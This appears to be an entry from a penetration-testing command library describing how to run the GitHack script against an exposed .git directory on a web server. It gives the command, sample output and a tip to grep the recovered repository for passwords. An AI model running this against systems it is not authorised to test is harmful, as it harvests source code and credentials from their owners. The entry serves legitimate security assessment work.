---
id: 108e206b-af27-4fad-b793-043eb1f48c82
name: python-run-githack-script
type: command
executor: python
data: python GitHack.py $_TARGET_GIT_URL
output: null
created_at: '2023-04-06T03:56:00.038892+00:00'
updated_at: '2023-04-10T20:33:53.121118+00:00'
platforms:
  - Linux
tags:
  - python
  - githack
  - exploitation
verified: true
validated: true
---

# python-run-githack-script

## Command

```bash
python GitHack.py $_TARGET_GIT_URL
```

## Description

This command executes the GitHack Python script to scan and recover Git repository data from an exposed .git directory on a target web server, reconstructing the repo and identifying sensitive information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_GIT_URL | The URL pointing to the exposed .git directory (e.g., http://example.com/.git/) | Yes |

## Examples

### Basic Usage

```bash
python GitHack.py http://web.site/.git/
```

### Advanced Usage

For verbose output or specific options, consult the script's help: `python GitHack.py -h` (if supported).

## Expected Output

[*] Target: http://web.site/.git/
[*] Download index
[+] index saved
[*] Download HEAD
[+] HEAD saved
[*] Download objects/info/packs
[+] packs saved
[*] Download refs
[+] refs saved
[*] Download logs
[+] logs saved
[+] All files saved, starting recovery...
[+] Recovered file: config
Content of config:
[remote "origin"]
	url = git@github.com:user/repo.git
[user]
	email = sensitive@example.com

A 'repo' directory is created with reconstructed files; search for secrets like 'grep -r "password" repo/'.

## Related

- [[procedures/GitHack-Exploiting-Insecure-Source-Code-Management]]
